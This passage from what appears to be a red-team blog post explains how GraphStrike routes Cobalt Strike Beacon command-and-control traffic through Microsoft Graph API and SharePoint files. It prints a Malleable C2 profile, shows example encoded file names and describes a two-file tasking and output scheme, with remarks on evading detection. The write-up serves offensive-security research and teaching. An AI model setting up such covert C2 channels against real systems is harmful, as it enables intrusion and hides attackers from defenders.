<p data-renderer-start-pos="50622">client</p>
</td>
<td colspan="1" rowspan="1">
<p data-renderer-start-pos="50632">metadata</p>
</td>
<td colspan="1" rowspan="1">
<p data-renderer-start-pos="50644">Session metadata</p>
</td>
</tr>
<tr>
<td colspan="1" rowspan="1">
<p data-renderer-start-pos="50666">http-get</p>
</td>
<td colspan="1" rowspan="1">
<p data-renderer-start-pos="50678">server</p>
</td>
<td colspan="1" rowspan="1">
<p data-renderer-start-pos="50688">output</p>
</td>
<td colspan="1" rowspan="1">
<p data-renderer-start-pos="50698">Beacon’s tasks</p>
</td>
</tr>
<tr>
<td colspan="1" rowspan="1">
<p data-renderer-start-pos="50718">http-post</p>
</td>
<td colspan="1" rowspan="1">
<p data-renderer-start-pos="50731">client</p>
</td>
<td colspan="1" rowspan="1">
<p data-renderer-start-pos="50741">id</p>
</td>
<td colspan="1" rowspan="1">
<p data-renderer-start-pos="50747">Session ID</p>
</td>
</tr>
<tr>
<td colspan="1" rowspan="1">
<p data-renderer-start-pos="50763">http-post</p>
</td>
<td colspan="1" rowspan="1">
<p data-renderer-start-pos="50776">client</p>
</td>
<td colspan="1" rowspan="1">
<p data-renderer-start-pos="50786">output</p>
</td>
<td colspan="1" rowspan="1">
<p data-renderer-start-pos="50796">Beacon’s responses</p>
</td>
</tr>
<tr>
<td colspan="1" rowspan="1">
<p data-renderer-start-pos="50820">http-post</p>
</td>
<td colspan="1" rowspan="1">
<p data-renderer-start-pos="50833">server</p>
</td>
<td colspan="1" rowspan="1">
<p data-renderer-start-pos="50843">output</p>
</td>
<td colspan="1" rowspan="1">
<p data-renderer-start-pos="50853">Empty</p>
</td>
</tr>
</tbody>
</table>
<div class="sentinel-right"></div>
</div>
</div>
<p data-renderer-start-pos="50863">Beacon is the ‘client’ in the above chart. In summary, each http-get that Beacon makes must include session metadata about that Beacon/host/process (this is what populates the data in the Cobalt Strike client), and each http-post must include the Beacon’s session ID which is a unique multi-digit number. The TS uses this data from each respective request type in order to identify which Beacon is asking for tasking or sending output. Both ‘metadata’ and ‘id’ are required fields in a Cobalt Strike profile, and there are options as to how they should be sent in a http-get or http-post request. These options include sending the data as an additional header, as a parameter, or even appending it to the URI of the request. The Cobalt Strike manual describes these customization options further in the <a class="cc-tgpl01" title="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_profile-language.htm#_Toc65482839:~:text=these%20inverse%20statements.-,Data,-Transform%20Language" href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_profile-language.htm#_Toc65482839:~:text=these%20inverse%20statements.-,Data,-Transform%20Language" data-testid="link-with-safety" data-renderer-mark="true">Data Transformation Language</a> <span id="f8b3f888-a2bf-4b30-8f61-7a0511796f1a" data-renderer-mark="true" data-mark-type="annotation" data-mark-annotation-type="inlineComment" data-id="f8b3f888-a2bf-4b30-8f61-7a0511796f1a">section</span>:</p>
<div class="pm-table-container with-shadow-observer" data-layout="custom">
<div class="pm-table-wrapper">
<table data-testid="renderer-table" data-number-column="false" data-table-width="760">
<colgroup>
<col>
<col></colgroup>
<tbody>
<tr>
<th class="ak-renderer-tableHeader-sortable-column__wrapper" colspan="1" rowspan="1" data-colwidth="243" aria-sort="none">
<div class="ak-renderer-tableHeader-sortable-column">
<p data-renderer-start-pos="51708"><strong data-renderer-mark="true">Statement</strong></p>
<figure class="ak-renderer-tableHeader-sorting-icon__wrapper ak-renderer-tableHeader-sorting-icon__no-order">
<div role="presentation">
<div class="ak-renderer-tableHeader-sorting-icon cc-gls7uu" tabindex="0" role="button" aria-label="No sort applied to the column" aria-disabled="false">
<div class="sorting-icon-svg__no_order ak-renderer-tableHeader-sorting-icon-inactive cc-37qivc">
<div class="cc-1h55k8m"></div>
</div>
</div>
</div>
</figure>
</div>
</th>
<th class="ak-renderer-tableHeader-sortable-column__wrapper" colspan="1" rowspan="1" data-colwidth="517" aria-sort="none">
<div class="ak-renderer-tableHeader-sortable-column">
<p data-renderer-start-pos="51721"><strong data-renderer-mark="true">What</strong></p>
<figure class="ak-renderer-tableHeader-sorting-icon__wrapper ak-renderer-tableHeader-sorting-icon__no-order">
<div role="presentation">
<div class="ak-renderer-tableHeader-sorting-icon cc-gls7uu" tabindex="0" role="button" aria-label="No sort applied to the column" aria-disabled="false">
<div class="sorting-icon-svg__no_order ak-renderer-tableHeader-sorting-icon-inactive cc-37qivc">
<div class="cc-1h55k8m"></div>
</div>
</div>
</div>
</figure>
</div>
</th>
</tr>
<tr>
<td colspan="1" rowspan="1" data-colwidth="243">
<p data-renderer-start-pos="51731">header “header”</p>
</td>
<td colspan="1" rowspan="1" data-colwidth="517">
<p data-renderer-start-pos="51750">Store data in an HTTP header</p>
</td>
</tr>
<tr>
<td colspan="1" rowspan="1" data-colwidth="243">
<p data-renderer-start-pos="51784">parameter “key”</p>
</td>
<td colspan="1" rowspan="1" data-colwidth="517">
<p data-renderer-start-pos="51803">Store data in a URI parameter</p>
</td>
</tr>
<tr>
<td colspan="1" rowspan="1" data-colwidth="243">
<p data-renderer-start-pos="51838">print</p>
</td>
<td colspan="1" rowspan="1" data-colwidth="517">
<p data-renderer-start-pos="51847">Send data as a transaction body</p>
</td>
</tr>
<tr>
<td colspan="1" rowspan="1" data-colwidth="243">
<p data-renderer-start-pos="51884">uri-append</p>
</td>
<td colspan="1" rowspan="1" data-colwidth="517">
<p data-renderer-start-pos="51898">Append to URI</p>
</td>
</tr>
</tbody>
</table>
<div class="sentinel-right"></div>
</div>
</div>
<p data-renderer-start-pos="51916">In contrast to Cobalt Strike profiles for traditional HTTP/HTTPS C2, the http-config, http-get, and http-post sections of the GraphStrike profile are very simplistic. As an example, no ‘header’ values are defined for use by Beacon in its requests because we must manually assemble the headers at runtime with the current access token. This minimalistic profile makes it easy to later manipulate Beacon data in the hooked functions set up by GraphLdr.</p>
<p data-renderer-start-pos="52369">The http-config block isn’t even really required for GraphStrike, as it controls how the Cobalt Strike web server responds to requests. In the GraphStrike model the TS is actually responding to requests from the GraphStrike server, not Beacon, so all of this communication is done locally and doesn’t require any kind of stealth or sneakiness.</p>
<p data-renderer-start-pos="52714">Looking at the http-get and http-post blocks, we can’t specify an actual real URI within the profile as each Beacon requires a unique one which we will be creating at runtime. Any extra, unrequired manipulation of the Beacon metadata or session ID is something we will have to contend with later on the GraphStrike server side, so we can keep it simple. The Beacon metadata is a binary blob, but we can base64url encode it so that it can be appended to the http-get request URI. The session ID can be appended to the http-post request URI without transformation.</p>
<p data-renderer-start-pos="53279">In terms of TS tasking and Beacon output, when the TS has tasking for Beacon we specify that it should just ‘print’ it, or send it in the body of the response. We additionally don’t manipulate or obfuscate this data (which is just an encrypted binary blob). Similarly when Beacon has output from completed tasking, we will instruct it to ‘print’ that output and send it untransformed in the body of the http-post request. Taken all together, the http-get and http-post blocks of the GraphStrike profile may be seen below:</p>
<div class="code-block cc-ceksvt">
<div class="cc-9n57oc">
<div class="cc-ygvpeu">
<div role="presentation">
<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-cpp enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-g1">&lt;</span><span class="enlighter-text">code data-language=</span><span class="enlighter-s0">"none"</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">http-config </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k4"># This section all relates to how the Cobalt Strike web server responds.</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k4"># It's all irrelevant for GraphStrike, since the TS is just responding to the GraphStrike server's requests.</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    set headers </span><span class="enlighter-s0">"Date, Server, Content-Length, Keep-Alive, Connection, Content-Type"</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    header </span><span class="enlighter-s0">"Server"</span><span class="enlighter-text"> </span><span class="enlighter-s0">"Apache"</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    header </span><span class="enlighter-s0">"Keep-Alive"</span><span class="enlighter-text"> </span><span class="enlighter-s0">"timeout=10, max=100"</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    header </span><span class="enlighter-s0">"Connection"</span><span class="enlighter-text"> </span><span class="enlighter-s0">"Keep-Alive"</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">http-get </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k4"># We just need our URI to be something unique and recognizable in order for GraphStrike to parse out values</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    set uri </span><span class="enlighter-s0">"/_"</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    set verb </span><span class="enlighter-s0">"GET"</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    client </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        metadata </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            base64url;</span></div></div><div class=""><div><span class="enlighter-text">            uri-append;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    server </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        output </span><span class="enlighter-g1">{</span><span class="enlighter-text">   </span></div></div><div class=""><div><span class="enlighter-text">            print;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">http-post </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k4"># We just need our URI to be something unique and recognizable in order for GraphStrike to parse out values</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    set uri </span><span class="enlighter-s0">"/-_"</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    set verb </span><span class="enlighter-s0">"POST"</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    client </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">       </span></div></div><div class=""><div><span class="enlighter-text">        id </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            uri-append;         </span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">              </span></div></div><div class=""><div><span class="enlighter-text">        output </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            print;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    server </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        output </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            print;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">}</span></div></div></div><div class="enlighter-raw">&lt;code data-language="none"&gt;http-config {
    # This section all relates to how the Cobalt Strike web server responds.
    # It's all irrelevant for GraphStrike, since the TS is just responding to the GraphStrike server's requests.
    set headers "Date, Server, Content-Length, Keep-Alive, Connection, Content-Type";
    header "Server" "Apache";
    header "Keep-Alive" "timeout=10, max=100";
    header "Connection" "Keep-Alive";
}

http-get {

    # We just need our URI to be something unique and recognizable in order for GraphStrike to parse out values
    set uri "/_";
    set verb "GET";

    client {

        metadata {
            base64url;
            uri-append;
        }
    }

    server {

        output {   
            print;
        }
    }
}

http-post {

    # We just need our URI to be something unique and recognizable in order for GraphStrike to parse out values
    set uri "/-_";
    set verb "POST";

    client {
       
        id {
            uri-append;         
        }
              
        output {
            print;
        }
    }

    server {

        output {
            print;
        }
    }
}</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="c">&lt;code&nbsp;data-language="none"&gt;http-config&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;This&nbsp;section&nbsp;all&nbsp;relates&nbsp;to&nbsp;how&nbsp;the&nbsp;Cobalt&nbsp;Strike&nbsp;web&nbsp;server&nbsp;responds.
&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;It's&nbsp;all&nbsp;irrelevant&nbsp;for&nbsp;GraphStrike,&nbsp;since&nbsp;the&nbsp;TS&nbsp;is&nbsp;just&nbsp;responding&nbsp;to&nbsp;the&nbsp;GraphStrike&nbsp;server's&nbsp;requests.
&nbsp;&nbsp;&nbsp;&nbsp;set&nbsp;headers&nbsp;"Date,&nbsp;Server,&nbsp;Content-Length,&nbsp;Keep-Alive,&nbsp;Connection,&nbsp;Content-Type";
&nbsp;&nbsp;&nbsp;&nbsp;header&nbsp;"Server"&nbsp;"Apache";
&nbsp;&nbsp;&nbsp;&nbsp;header&nbsp;"Keep-Alive"&nbsp;"timeout=10,&nbsp;max=100";
&nbsp;&nbsp;&nbsp;&nbsp;header&nbsp;"Connection"&nbsp;"Keep-Alive";
}

http-get&nbsp;{

&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;We&nbsp;just&nbsp;need&nbsp;our&nbsp;URI&nbsp;to&nbsp;be&nbsp;something&nbsp;unique&nbsp;and&nbsp;recognizable&nbsp;in&nbsp;order&nbsp;for&nbsp;GraphStrike&nbsp;to&nbsp;parse&nbsp;out&nbsp;values
&nbsp;&nbsp;&nbsp;&nbsp;set&nbsp;uri&nbsp;"/_";
&nbsp;&nbsp;&nbsp;&nbsp;set&nbsp;verb&nbsp;"GET";

&nbsp;&nbsp;&nbsp;&nbsp;client&nbsp;{

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;metadata&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;base64url;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;uri-append;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;}

&nbsp;&nbsp;&nbsp;&nbsp;server&nbsp;{

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;output&nbsp;{&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;}
}

http-post&nbsp;{

&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;We&nbsp;just&nbsp;need&nbsp;our&nbsp;URI&nbsp;to&nbsp;be&nbsp;something&nbsp;unique&nbsp;and&nbsp;recognizable&nbsp;in&nbsp;order&nbsp;for&nbsp;GraphStrike&nbsp;to&nbsp;parse&nbsp;out&nbsp;values
&nbsp;&nbsp;&nbsp;&nbsp;set&nbsp;uri&nbsp;"/-_";
&nbsp;&nbsp;&nbsp;&nbsp;set&nbsp;verb&nbsp;"POST";

&nbsp;&nbsp;&nbsp;&nbsp;client&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;id&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;uri-append;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;output&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;}

&nbsp;&nbsp;&nbsp;&nbsp;server&nbsp;{

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;output&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;}
}</pre>
</div>
<div role="presentation">
<div>C2lint can be used to visualize what Beacon’s pre-programmed http-get and http-post requests will look like:</div>
<div></div>
</div>
</div>
</div>
</div>
<div class="rich-media-item mediaSingleView-content-wrap image-center cc-4kagsy" data-layout="center" data-width="760" data-width-type="pixel" data-node-type="mediaSingle">
<div class="cc-yfwg0r">
<div data-type="file" data-node-type="media" data-width="760" data-height="516" data-id="fb4d8358-4f27-487c-bd75-93f3db2616b8" data-collection="contentId-85164073" data-file-name="image-20240118-175208.png" data-file-size="58469" data-file-mime-type="image/png" data-alt="image-20240118-175208.png" data-context-id="85164073">
<div id="newFileExperienceWrapper" class="new-file-experience-wrapper cc-qh42x1" data-testid="media-card-view">
<div style="width: 770px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" class="size-medium" src="https://redsiege.com/wp-content/uploads/2024/01/06.-Graph-Strike.png" alt="GraphStrike Profile Http-Get and Http-Post Request Examples" width="760" height="516"><p class="wp-caption-text">GraphStrike Profile Http-Get and Http-Post Request Examples</p></div>
</div>
</div>
</div>
<div class="cc-m15eub" data-media-caption="true" data-testid="media-caption" data-renderer-start-pos="55034"></div>
</div>
<p data-renderer-start-pos="55096">Again, the default requests are very plain and un-obfuscated (not to mention non-functional for Graph API). By setting up the profile in this manner we are positioning ourselves to be able to parse and manipulate key data within our hooked functions. For example, by noting that the GET URI begins with “/_” and that the POST URI begins with “/-_”, we can simply trim these prepended identifiers off in order to access the Beacon metadata as well as the session ID. Example TS tasking (http-get block, blue) and Beacon output (http-post block, red) can be seen as the jibberish strings printed below the headers. Having made our important Beacon data easily accessible, it’s time to try and use it with SharePoint files.</p>
<p>&nbsp;</p>
<h4 id="Square-Pegs-and-Round-Holes" data-renderer-start-pos="55818"><span class="ez-toc-section" id="Square_Pegs_and_Round_Holes" ez-toc-data-id="#Square_Pegs_and_Round_Holes"></span>Square Pegs and Round Holes<span class="ez-toc-section-end"></span></h4>
<div class="rich-media-item mediaSingleView-content-wrap image-center cc-1nj4rzf" data-layout="center" data-width="480" data-width-type="pixel" data-node-type="mediaSingle">
<div class="cc-hnwjf0">
<div data-type="file" data-node-type="media" data-width="480" data-height="270" data-id="534f769a-fd80-4428-a570-ede2fe854d01" data-collection="contentId-85164073" data-file-name="oyCqgS.gif" data-file-size="4699397" data-file-mime-type="image/gif" data-alt="oyCqgS.gif" data-context-id="85164073">
<div id="newFileExperienceWrapper" class="new-file-experience-wrapper cc-khutp8" data-testid="media-card-view">
<div style="width: 350px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" class="" src="https://redsiege.com/wp-content/uploads/2024/01/07.-Graph-Strike.gif" alt="https://i.makeagif.com/media" width="340" height="191"><p class="wp-caption-text">https://i.makeagif.com/media</p></div>
</div>
</div>
</div>
<div class="cc-m15eub" data-media-caption="true" data-testid="media-caption" data-renderer-start-pos="55849"></div>
</div>
<p data-renderer-start-pos="55880"><span id="4d20acb6-0b33-47e8-9ca7-bf40716b606b" data-renderer-mark="true" data-mark-type="annotation" data-mark-annotation-type="inlineComment" data-id="4d20acb6-0b33-47e8-9ca7-bf40716b606b">With</span> our profile set up to make Beacon’s important data available to us, it is time to figure out how we can use Graph API and SharePoint files to:</p>
<ol class="ak-ol" start="1" data-indent-level="1">
<li>
<p data-renderer-start-pos="56031">Create a unique file(s?) for this Beacon to use for its tasking and output.</p>
</li>
<li>
<p data-renderer-start-pos="56110">Communicate Beacon’s identifying information to the TS alongside the actual C2 data.</p>
</li>
</ol>
<p data-renderer-start-pos="56198">I’m compelled to reiterate that there are major conceptual differences between normal Cobalt Strike HTTPS communications and GraphStrike communications. To help illustrate this I’ll reuse and slightly modify a graphic from earlier:</p>
</div>
</div>
<div style="width: 769px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" class="size-medium" src="https://redsiege.com/wp-content/uploads/2024/01/08.-Graph-Strike.png" alt="Separate HTTPS Transactions in a Single Http-Get or Http-Post Cycle" width="759" height="448"><p class="wp-caption-text">Separate HTTPS Transactions in a Single Http-Get or Http-Post Cycle</p></div>
<p data-renderer-start-pos="56198">Each red oval identifies a separate and completely independent HTTPS request; that is to say, there is no forwarding of requests happening here like is commonly done using a public redirector. Additionally instead of only the Beacon needing to reach out to the internet, in GraphStrike the server side of the equation must also reach out to fetch data. This results in there being no true synchronicity between Beacon and the TS. Each side sends data when it is available, and the other must continually check for / retrieve new data it is available. These factors in combination led me to use <em data-renderer-mark="true">two</em> SharePoint files for a single Beacon; one that the TS uploads tasking to and that Beacon downloads from, and one that Beacon uploads output to and that the GraphStrike server downloads from.</p>
</div>
</div>
</div>
</div>
<p data-renderer-start-pos="56198">
</p><div id="newFileExperienceWrapper" class="new-file-experience-wrapper cc-1r63qe5" data-testid="media-card-view">
<div class="code-block cc-ceksvt">
<div id="attachment_4613" style="width: 672px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" aria-describedby="caption-attachment-4613" class="wp-image-4613 " src="https://redsiege.com/wp-content/uploads/2024/01/09.-Graph-Strike.png" alt="Two File Model Within SharePoint" width="662" height="555" srcset="https://redsiege.com/wp-content/uploads/2024/01/09.-Graph-Strike.png 942w, https://redsiege.com/wp-content/uploads/2024/01/09.-Graph-Strike-300x252.png 300w, https://redsiege.com/wp-content/uploads/2024/01/09.-Graph-Strike-768x644.png 768w" sizes="(max-width: 662px) 100vw, 662px"><p id="caption-attachment-4613" class="wp-caption-text">Two File Model Within SharePoint</p></div>
<p data-renderer-start-pos="56198">
</p><p data-renderer-start-pos="56198">As mentioned before the TS tasking and Beacon output will be stored as the actual content of the SharePoint files, so we need to ‘label’ these files in such a way so as to communicate the associated Beacon metadata and session ID. It is helpful to look at the structure of the <a class="cc-tgpl01" title="https://learn.microsoft.com/en-us/graph/api/resources/driveitem?view=graph-rest-1.0" href="https://learn.microsoft.com/en-us/graph/api/resources/driveitem?view=graph-rest-1.0" data-testid="link-with-safety" data-renderer-mark="true">driveItem resource</a> (driveItem is synonymous with ‘file’ for our purposes). Most of the properties of a driveItem are read-only, but there are a few that are modifiable that could serve our purposes. The most obvious and simple to use was the driveItem’s name, which is a user-supplied arbitrary <span id="7ec6a09d-7e99-47e9-b44f-59ced730cb2a" data-renderer-mark="true" data-mark-type="annotation" data-mark-annotation-type="inlineComment" data-id="7ec6a09d-7e99-47e9-b44f-59ced730cb2a">string</span>:</p>
<div class="cc-9n57oc">
<div class="cc-ygvpeu">
<div style="width: 975px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" class="" src="https://redsiege.com/wp-content/uploads/2024/01/010.-Graph-Strike.png" alt="Name Property of the driveItem Resource" width="965" height="61"><p class="wp-caption-text">Name Property of the driveItem Resource</p></div>
<p data-renderer-start-pos="56198">There is more that could be done in terms of evasion / avoiding IOC’s, but for the public release and for simplicity I opted to use Beacon’s base64url encoded metadata for the TS tasking file’s name. For the Beacon output file both the Beacon metadata AND the Beacon session ID are used, separated by a pre-defined delimiter (“pD9-tk”) so that we can parse the two values <span id="720161d9-3c15-4516-8cca-7e559094bab7" data-renderer-mark="true" data-mark-type="annotation" data-mark-annotation-type="inlineComment" data-id="720161d9-3c15-4516-8cca-7e559094bab7">later. An example of each of these files in SharePoint is shown below</span>:</p>
<div style="width: 1215px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" class="" src="https://redsiege.com/wp-content/uploads/2024/01/011.-Graph-Strike.png" alt="Example TS Tasking and Beacon Output Files in SharePoint" width="1205" height="148"><p class="wp-caption-text">Example TS Tasking and Beacon Output Files in SharePoint</p></div>
<p data-renderer-start-pos="56198">For this particular Beacon the relevant information can be summarized as so:</p>
<div role="presentation">
<div class="code-block cc-ceksvt">
<div class="pm-table-container with-shadow-observer" data-layout="custom">
<div class="pm-table-wrapper">
<table data-testid="renderer-table" data-number-column="false" data-table-width="760">
<colgroup>
<col>
<col></colgroup>
<tbody>
<tr>
<th class="ak-renderer-tableHeader-sortable-column__wrapper" colspan="1" rowspan="1" data-colwidth="205" aria-sort="none">
<div class="ak-renderer-tableHeader-sortable-column">
<p data-renderer-start-pos="58542"><strong data-renderer-mark="true">Item</strong></p>
<figure class="ak-renderer-tableHeader-sorting-icon__wrapper ak-renderer-tableHeader-sorting-icon__no-order">
<div role="presentation">
<div class="ak-renderer-tableHeader-sorting-icon cc-gls7uu" tabindex="0" role="button" aria-label="No sort applied to the column" aria-disabled="false">
<div class="sorting-icon-svg__no_order ak-renderer-tableHeader-sorting-icon-inactive cc-37qivc">
<div class="cc-1h55k8m"></div>
</div>
</div>
</div>
</figure>
</div>
</th>
<th class="ak-renderer-tableHeader-sortable-column__wrapper" colspan="1" rowspan="1" data-colwidth="553" aria-sort="none">
<div class="ak-renderer-tableHeader-sortable-column">
<p data-renderer-start-pos="58550"><strong data-renderer-mark="true">Value</strong></p>
<figure class="ak-renderer-tableHeader-sorting-icon__wrapper ak-renderer-tableHeader-sorting-icon__no-order">
<div role="presentation">
<div class="ak-renderer-tableHeader-sorting-icon cc-gls7uu" tabindex="0" role="button" aria-label="No sort applied to the column" aria-disabled="false">
<div class="sorting-icon-svg__no_order ak-renderer-tableHeader-sorting-icon-inactive cc-37qivc">
<div class="cc-1h55k8m"></div>
</div>
</div>
</div>
</figure>
</div>
</th>
</tr>
<tr>
<td colspan="1" rowspan="1" data-colwidth="205">
<p data-renderer-start-pos="58561">TS Tasking File Name</p>
</td>
<td colspan="1" rowspan="1" data-colwidth="553">
<p data-renderer-start-pos="58585">AMFTYYnvh-NZ7q87nb32BV03vz-tP1vaoxmfdwKTeba6D7azteJONYntyP79j7L7-QWynYagPhJ0qgBk7albtTKi4tmJlfIBfcoVaHcmMehvzQcZar1OC1hQj64cXfBDSRs-u2Sp9P0GNglZejsQ7BcCA-3cirbd0wInvbhStW0</p>
</td>
</tr>
<tr>
<td colspan="1" rowspan="1" data-colwidth="205">
<p data-renderer-start-pos="58762">Beacon Output File Name</p>
</td>
<td colspan="1" rowspan="1" data-colwidth="553">
<p data-renderer-start-pos="58789">AMFTYYnvh-NZ7q87nb32BV03vz-tP1vaoxmfdwKTeba6D7azteJONYntyP79j7L7-QWynYagPhJ0qgBk7albtTKi4tmJlfIBfcoVaHcmMehvzQcZar1OC1hQj64cXfBDSRs-u2Sp9P0GNglZejsQ7BcCA-3cirbd0wInvbhStW0pD9-tK1123716960</p>
</td>
</tr>
<tr>
<td colspan="1" rowspan="1" data-colwidth="205">
<p data-renderer-start-pos="58982">Beacon Metadata</p>
</td>
<td colspan="1" rowspan="1" data-colwidth="553">
